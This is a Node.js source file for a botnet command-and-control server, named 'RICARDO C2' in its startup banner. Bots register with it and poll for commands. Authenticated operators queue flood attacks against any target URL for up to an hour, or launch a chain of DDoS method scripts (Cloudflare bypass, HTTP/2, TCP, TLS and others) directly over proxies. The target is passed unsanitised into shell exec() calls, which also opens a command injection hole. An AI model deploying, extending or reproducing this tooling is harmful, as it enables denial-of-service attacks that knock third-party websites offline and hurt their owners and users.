const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;
const AUTH_TOKEN = process.env.AUTH_TOKEN || crypto.randomBytes(32).toString('hex');

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use('/api/', limiter);

// Auth middleware
const authenticate = (req, res, next) => {
  const token = req.headers['authorization'] || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// Data stores
let connectedBots = [];
let pendingCommands = {};
let stopCommands = new Set();
let blockedBots = new Set();

// Stats
let botStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  requestsPerSecond: 0,
  requestsPerMinute: 0,
  totalRequests: 0,
  attacksByMethod: {},
  attacksByTarget: {},
  botsByStatus: { online: 0, offline: 0, attacking: 0 },
  averageResponseTime: 0,
  peakRPS: 0,
  peakRPM: 0
};

// Request tracking
let requestTimestamps = [];
let minuteRequestCount = 0;
let currentMinute = new Date().getMinutes();

// Update RPS
setInterval(() => {
  const now = Date.now();
  requestTimestamps = requestTimestamps.filter(ts => now - ts < 1000);
  botStats.requestsPerSecond = requestTimestamps.length;
  if (botStats.requestsPerSecond > botStats.peakRPS) {
    botStats.peakRPS = botStats.requestsPerSecond;
  }
}, 1000);

// Update RPM
setInterval(() => {
  const minute = new Date().getMinutes();
  if (minute !== currentMinute) {
    botStats.requestsPerMinute = minuteRequestCount;
    if (minuteRequestCount > botStats.peakRPM) {
      botStats.peakRPM = minuteRequestCount;
    }
    minuteRequestCount = 0;
    currentMinute = minute;
  }
}, 1000);

// Request tracking middleware
app.use((req, res, next) => {
  const start = Date.now();
  requestTimestamps.push(start);
  minuteRequestCount++;
  botStats.totalRequests++;
  
  res.on('finish', () => {
    const duration = Date.now() - start;
    if (botStats.averageResponseTime === 0) {
      botStats.averageResponseTime = duration;
    } else {
      botStats.averageResponseTime = (botStats.averageResponseTime * 0.9) + (duration * 0.1);
    }
  });
  next();
});

// Bot heartbeat timeout
const BOT_TIMEOUT = 30000;

// Cleanup inactive bots
setInterval(() => {
  const now = Date.now();
  connectedBots = connectedBots.filter(bot => {
    if (now - bot.lastSeen > BOT_TIMEOUT) {
      console.log(`[CLEANUP] Removing inactive bot: ${bot.url}`);
      return false;
    }
    return true;
  });
  
  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
  botStats.botsByStatus = {
    online: online,
    offline: connectedBots.length - online,
    attacking: Object.keys(pendingCommands).length
  };
}, 10000);

// Method files
const methodFiles = {
  'CF-BYPASS': 'methods/cf-bypass.js',
  'MODERN-FLOOD': 'methods/modern-flood.js',
  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
  'RAW-HTTP': 'methods/h2-nust.js',
  'R9': 'methods/high-dstat.js',
  'PRIV-TOR': 'methods/w-flood1.js',
  'HOLD-PANEL': 'methods/http-panel.js',
  'R1': 'methods/vhold.js',
  'UAM': 'methods/uam.js',
  'W.I.L': 'methods/wil.js',
  'R10-TCP': 'methods/r10-tcp.js',
  'R10-TLS': 'methods/r10-tls.js',
  'R10-CONN': 'methods/r10-conn.js',
  'R10-HEADER': 'methods/r10-header.js',
  'R10-FRAG': 'methods/r10-frag.js',
  'R10-PIPE': 'methods/r10-pipe.js',
  'R10-COOKIE': 'methods/r10-cookie.js',
  'R10-MIXED': 'methods/r10-mixed.js',
  'R10-LOWCPU': 'methods/r10-lowcpu.js',
  'RAPID10': 'methods/r10-rapid.js'
};

// ========== API ENDPOINTS ==========

// Bot registration
app.post('/register', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'Bot URL required' });

  if (blockedBots.has(url)) {
    return res.status(403).json({ error: 'Bot is blocked' });
  }

  const exists = connectedBots.find(bot => bot.url === url);
  if (exists) {
    exists.lastSeen = Date.now();
    return res.json({ message: 'Bot already registered', approved: true });
  }

  const newBot = { 
    url, 
    time: new Date().toLocaleTimeString(), 
    approved: true, 
    lastSeen: Date.now(),
    attacksPerformed: 0,
    totalRequests: 0
  };
  
  connectedBots.push(newBot);
  botStats.totalBots = connectedBots.length;
  console.log(`[REGISTER] New bot: ${url}`);
  
  res.json({ message: 'Bot registered successfully', approved: true, bot: newBot });
});

// Command polling
app.get('/get-command', (req, res) => {
  const { botUrl } = req.query;
  if (!botUrl) return res.status(400).json({ error: 'Bot URL required' });
  
  const bot = connectedBots.find(b => b.url === botUrl);
  if (bot) bot.lastSeen = Date.now();
  
  if (stopCommands.has(botUrl)) {
    stopCommands.delete(botUrl);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }
  
  if (pendingCommands[botUrl]) {
    const command = pendingCommands[botUrl];
    delete pendingCommands[botUrl];
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }
  
  res.json({ hasCommand: false });
});

// Attack report
app.post('/api/report', authenticate, (req, res) => {
  const { botUrl, target, method, requests } = req.body;
  
  botStats.totalRequests += requests || 0;
  botStats.attacksByMethod[method] = (botStats.attacksByMethod[method] || 0) + 1;
  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;
  
  const bot = connectedBots.find(b => b.url === botUrl);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.totalRequests = (bot.totalRequests || 0) + (requests || 0);
  }
  
  res.json({ success: true });
});

// Get all bots
app.get('/bots', authenticate, (req, res) => {
  res.json({ bots: connectedBots });
});

// Get blocked bots
app.get('/blocked', authenticate, (req, res) => {
  res.json({ blocked: Array.from(blockedBots) });
});

// Get live stats
app.get('/api/stats', authenticate, (req, res) => {
  const now = Date.now();
  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
  
  botStats.botsByStatus = {
    online: online,
    offline: connectedBots.length - online,
    attacking: Object.keys(pendingCommands).length
  };
  botStats.totalBots = connectedBots.length;
  
  res.json(botStats);
});

// Health check
app.get('/ping', (req, res) => {
  res.json({ 
    alive: true, 
    timestamp: Date.now(),
    bots: connectedBots.length,
    uptime: process.uptime()
  });
});

// Attack a specific bot
app.get('/attack-bot', authenticate, (req, res) => {
  const { bot, target, time, methods } = req.query;
  if (!bot || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters' });
  }
  
  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600)' });
  }
  
  pendingCommands[bot] = { target, time: timeNum, methods, timestamp: Date.now() };
  
  botStats.totalAttacks++;
  botStats.activeAttacks++;
  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
  
  res.json({ success: true, message: 'Command queued' });
});

// Stop a specific bot
app.get('/stop-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  delete pendingCommands[bot];
  stopCommands.add(bot);
  res.json({ success: true, message: 'Stop command queued' });
});

// Stop all bots
app.get('/stop-all', authenticate, (req, res) => {
  pendingCommands = {};
  connectedBots.forEach(bot => stopCommands.add(bot.url));
  botStats.activeAttacks = 0;
  res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
});

// Block a bot
app.get('/block-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  blockedBots.add(bot);
  connectedBots = connectedBots.filter(b => b.url !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  botStats.totalBots = connectedBots.length;
  
  res.json({ success: true, message: 'Bot blocked' });
});

// Unblock a bot
app.get('/unblock-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  blockedBots.delete(bot);
  res.json({ success: true, message: 'Bot unblocked' });
});

// Server-side attack
app.get('/attack', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.status(400).json({ error: 'Invalid time (1-3600)' });
  }

  const methodFile = methodFiles[methods];
  if (!methodFile || !fs.existsSync(methodFile)) {
    return res.status(400).json({ error: `Method file not found: ${methods}` });
  }

  console.log(`\n[ATTACK] ${methods} -> ${target} for ${timeNum}s`);
  
  botStats.totalAttacks++;
  botStats.activeAttacks++;
  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;

  res.json({ 
    success: true,
    message: 'Attack launched', 
    target, 
    time: timeNum, 
    methods
  });

  const execCmd = (cmd) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) { 
        console.error(`[ERROR] ${error.message}`); 
        botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
        return; 
      }
      if (stdout) {
        const lines = stdout.split('\n');
        const reqLines = lines.filter(l => l.includes('Request') || l.includes('GET')).length;
        if (reqLines > 0) botStats.totalRequests += reqLines;
      }
    });
  };

  // Execute method
  const methodMap = {
    'CF-BYPASS': `node methods/cf-bypass.js ${target} ${timeNum} 4 32 proxy.txt`,
    'MODERN-FLOOD': `node methods/modern-flood.js ${target} ${timeNum} 4 64 proxy.txt`,
    'HTTP-SICARIO': `node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1 && node methods/cibi.js ${target} ${timeNum} 16 3 proxy.txt && node methods/BYPASS.js ${target} ${timeNum} 32 2 proxy.txt && node methods/nust.js ${target} ${timeNum} 12 4 proxy.txt`,
    'RAW-HTTP': `node methods/h2-nust ${target} ${timeNum} 15 2 proxy.txt && node methods/http-panel.js ${target} ${timeNum}`,
    'R9': `node methods/high-dstat.js ${target} ${timeNum} 32 7 proxy.txt && node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt && node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt && node methods/nust.js ${target} ${timeNum} 16 2 proxy.txt && node methods/BYPASS.js ${target} ${timeNum} 8 1 proxy.txt`,
    'PRIV-TOR': `node methods/w-flood1.js ${target} ${timeNum} 64 6 proxy.txt && node methods/high-dstat.js ${target} ${timeNum} 16 2 proxy.txt && node methods/cibi.js ${target} ${timeNum} 12 4 proxy.txt && node methods/BYPASS.js ${target} ${timeNum} 10 4 proxy.txt && node methods/nust.js ${target} ${timeNum} 10 1 proxy.txt`,
    'HOLD-PANEL': `node methods/http-panel.js ${target} ${timeNum}`,
    'R1': `node methods/vhold.js ${target} ${timeNum} 15 2 proxy.txt && node methods/high-dstat.js ${target} ${timeNum} 64 2 proxy.txt && node methods/cibi.js ${target} ${timeNum} 4 2 proxy.txt && node methods/BYPASS.js ${target} ${timeNum} 16 2 proxy.txt && node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1 && node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt && node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt && node methods/nust.js ${target} ${timeNum} 32 3 proxy.txt`,
    'RAPID10': `node methods/r10-rapid.js ${target} ${timeNum} 10000 && node methods/r10-tcp.js ${target} ${timeNum} && node methods/r10-tls.js ${target} ${timeNum} && node methods/r10-conn.js ${target} ${timeNum} && node methods/r10-header.js ${target} ${timeNum} 5000 && node methods/r10-frag.js ${target} ${timeNum} && node methods/r10-pipe.js ${target} ${timeNum} && node methods/r10-cookie.js ${target} ${timeNum} && node methods/r10-mixed.js ${target} ${timeNum} && node methods/r10-lowcpu.js ${target} ${timeNum} 1000`,
    'UAM': `node methods/uam.js ${target} ${timeNum} 5 4 6`,
    'W.I.L': `node methods/wil.js ${target} ${timeNum} 10 8 4`
  };

  const cmd = methodMap[methods];
  if (cmd) {
    if (cmd.includes('&&')) {
      cmd.split('&&').forEach(c => execCmd(c.trim()));
    } else {
      execCmd(cmd);
    }
  }

  setTimeout(() => {
    botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
  }, timeNum * 1000);
});

// Error handler
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(port, () => {
  console.log('\n========================================');
  console.log('🚀 RICARDO C2 API SERVER');
  console.log('========================================');
  console.log(`📍 Port:      ${port}`);
  console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
  console.log(`📊 API Endpoints:`);
  console.log(`   POST /register - Bot registration`);
  console.log(`   GET  /get-command - Command polling`);
  console.log(`   GET  /bots - List bots (auth)`);
  console.log(`   GET  /api/stats - Live stats (auth)`);
  console.log(`   GET  /attack - Server attack (auth)`);
  console.log(`   GET  /attack-bot - Attack specific bot (auth)`);
  console.log(`   GET  /stop-all - Stop all attacks (auth)`);
  console.log(`   GET  /block-bot - Block bot (auth)`);
  console.log(`   GET  /unblock-bot - Unblock bot (auth)`);
  console.log(`   GET  /ping - Health check`);
  console.log('========================================\n');
  
  // Create directories
  if (!fs.existsSync('./methods')) fs.mkdirSync('./methods');
  if (!fs.existsSync('./proxy.txt')) {
    fs.writeFileSync('./proxy.txt', '# Add proxies here\n# Format: ip:port\n');
  }
});
